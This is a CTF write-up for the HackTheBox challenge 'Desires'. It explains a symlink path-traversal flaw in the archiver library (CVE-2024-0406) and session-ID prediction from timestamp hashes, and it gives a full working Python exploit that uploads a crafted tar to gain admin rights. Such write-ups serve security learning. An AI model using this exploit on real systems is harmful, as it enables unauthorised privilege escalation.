---
title: HTB Challenge - Desires
description:
draft: true
tags:
  - HackTheBox
  - CTF
created: 24/32/2025 06:32
updated: 23/07/2026 21:07
---
# Overview:
The HTB challenge had a path traversal vulnerabilities which can be exploited to upload crafted sessions files changing the role of a user to admin.

Below is an image overview of the attack.
![[HTB Challenge - Desires image_1.png]]
2 users(user1 = **attacker**, and user2 = **exploit**) were created before the attack begin. 
1. Login of attacker for file upload. 
2. user `exploit` performs a failed login. this is to create a user session in cache without creating a session file. 
3. Upload the crafted payload to the web server. The web server unzips the file and drops the crafted session file in the session directory.
4. The user `exploit` access the web server with the cookie value for username set to `exploit`. The web server grabs the sessionID from Redis and gets the file malicious session file, Thus giving the user `exploit` the role of Admin.

# Path traversal Vulnerability:
Looking at imports I noticed a package: `github.com/mholt/archiver/v3`. 
Visiting the github page shows the following.
![[HTB Challenge - Desires image_2.png]]

Googling the vulnerability gave me a POC in GitHub:  https://github.com/walidpyh/CVE-2024-0406-POC. This POC was interesting. without much modification it was able to automatically add the payload to the desired `/tmp/sessions` folder. almost like it was meant for this challenge. 

# Solution Code
```python
import os
import tarfile
import io
import requests
from typing import Optional, Dict


# Got the got from https://github.com/walidpyh/CVE-2024-0406-POC
# Modified create_malicious_archive() function.
class SymlinkArchiveExploit:  
    def __init__(
        self,
        target_path: str,
        payload_data: str,
        symlink_name: str = "symlink_pyld",
        archive_name: str = "malicious.tar"
    ):
        """
        Initialize the exploit generator
        
        :param target_path: Target path for symlink traversal
        :param payload_data: Data to write to the target file
        :param symlink_name: Name for the symlink/payload file
        :param archive_name: Output filename for the malicious archive
        """
        self.target_path = target_path
        self.payload_data = payload_data
        self.symlink_name = symlink_name
        self.archive_name = archive_name

    # Modified to allow for multiple session file name:
    def create_malicious_archive(self, *session_file_name) -> bool:
        """
        Create a tar archive containing both a symlink and payload file. 
        
        :return: True if creation succeeded, False otherwise
        """
        try:
            with tarfile.open(self.archive_name, "w") as tar:
                # Create symlink entry
                symlink_info = tarfile.TarInfo(name=self.symlink_name)
                symlink_info.type = tarfile.SYMTYPE
                symlink_info.linkname = self.target_path
                tar.addfile(symlink_info)

                # Create payload file with same name as symlink
                # add multiple files with different names to the archive
                for session in session_file_name:
                    payload_info = tarfile.TarInfo(name=self.symlink_name + f"/{session}")
                    payload_info.size = len(self.payload_data)
                    tar.addfile(payload_info, io.BytesIO(self.payload_data.encode('utf-8')))
            return True
        except Exception as e:
            print(f"Error creating archive: {str(e)}")
            return False

    def upload_archive(
        self,
        upload_url: str,
        cookies: Optional[Dict] = None,
        headers: Optional[Dict] = None
    ) -> bool:
        """
        Upload the generated archive to a target endpoint
        
        :param upload_url: Full URL for upload endpoint
        :param cookies: Optional cookies for authenticated requests
        :param headers: Optional custom headers
        :return: True if upload succeeded, False otherwise
        """
        try:
            with open(self.archive_name, 'rb') as f:
                files = {'archive': (self.archive_name, f, 'application/x-tar')}
                response = requests.post(
                    upload_url,
                    files=files,
                    cookies=cookies,
                    headers=headers
                )
                
                if response.status_code == 200:
                    print("Upload successful")
                    return True
                
                print(f"Upload failed: {response.status_code} - {response.text}")
                return False
        except Exception as e:
            print(f"Upload error: {str(e)}")
            return False
        finally:
            self.cleanup()

    def cleanup(self) -> None:
        """Remove generated archive file"""
        if os.path.exists(self.archive_name):
            os.remove(self.archive_name)
            print("Temporary files cleaned up")


###########  My Codes  ###########
from requests import post, get
from time import time
from hashlib import sha256

# Get Current time
# NOTE: Create user speratly.
base_url = 'http://127.0.0.1:1337/'
user_attacker = {'username': 'attacker', 'password':'password'}
user_exploit = "exploit"  # No need for password.
respn = post(base_url + "login", data=user_attacker, allow_redirects = False)
time_now = int(time())
computed_hash = sha256(str(time_now).encode()).hexdigest()
respn_hash = respn.headers['Set-Cookie'][8:72]
print("Responsed: ", respn_hash)

# Brute-force session ID to determine the time difference between the local browser and the server.
num = 0
tmp_time = None
add = None
while respn_hash != computed_hash:
    num += 1
    add = True
    tmp_time = time_now + num
    computed_hash = sha256(str(tmp_time).encode()).hexdigest()
    if respn_hash == computed_hash:
        break
    tmp_time = time_now - num
    add = False
    computed_hash = sha256(str(tmp_time).encode()).hexdigest()

print(f"{tmp_time}: {computed_hash}")

# Create failed login to add user to REDIS cache
post(base_url + "login", data={'username':user_exploit, 'password':'wrong_password'}, allow_redirects = False)
time_now = int(time())

# Adds buffers to hash timeing
if add:
    time_now += num
if not add:
    time_now -= num

computed_hash = sha256(str(time_now).encode()).hexdigest()
computed_hash2 = sha256(str(time_now + 1).encode()).hexdigest()
computed_hash3 = sha256(str(time_now - 1).encode()).hexdigest()
computed_hash4 = sha256(str(time_now + 2).encode()).hexdigest()
computed_hash5 = sha256(str(time_now - 2).encode()).hexdigest()

exploit = SymlinkArchiveExploit(
    target_path="/tmp/sessions/" + user_exploit,
    payload_data='{"username":"attacker","id":1,"role":"admin"}',
    symlink_name="symlink",
    archive_name="malicious.tar"
    )

exploit.create_malicious_archive(computed_hash, computed_hash2,computed_hash3, computed_hash4, computed_hash5)

exploit.upload_archive(
        upload_url=base_url + "user/upload",
        cookies={"session": respn_hash, "username":user_attacker['username']},
        headers={"User-Agent": "CVE-2024-0406 Client"}
    )
print(f"predicted session: \n{time_now}: {computed_hash}\n{time_now + 1}(+1): {computed_hash2}\n{time_now - 1}(-1): {computed_hash3}\n{time_now + 2}(+2): {computed_hash4}\n{time_now - 2}(-2): {computed_hash5}\n")

rspn = get(base_url + "user/admin", cookies={'session':"any_value_is_fine", 'username':user_exploit})
print(rspn.text)
```

![[HTB Challenge - Desires image1.png]]

![[HTB Challenge - Desires image2.png]]
# Note:
- If you uploaded once and need to reupload. change the file name of the `symlink_name` else a already exist error will appear.
- If you use a sessions file that is already in the `/tmp/sessions` it will raise a file already exist error.